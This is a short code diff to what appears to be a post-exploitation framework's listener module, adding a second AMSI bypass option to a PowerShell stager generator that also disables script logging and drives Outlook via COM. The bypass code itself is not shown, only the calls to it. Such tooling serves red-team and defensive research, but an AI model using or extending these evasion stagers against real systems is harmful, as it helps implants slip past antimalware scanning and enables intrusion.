@@ -167,7 +167,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -197,6 +197,9 @@ class Listener:
                     # @mattifestation's AMSI bypass
                     if AMSIBypass:
                         stager += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
                     stager += "};"
                     stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
                     stager += "$"+helpers.generate_random_script_var_name("GPF")+" = New-Object -comobject Outlook.Application;"
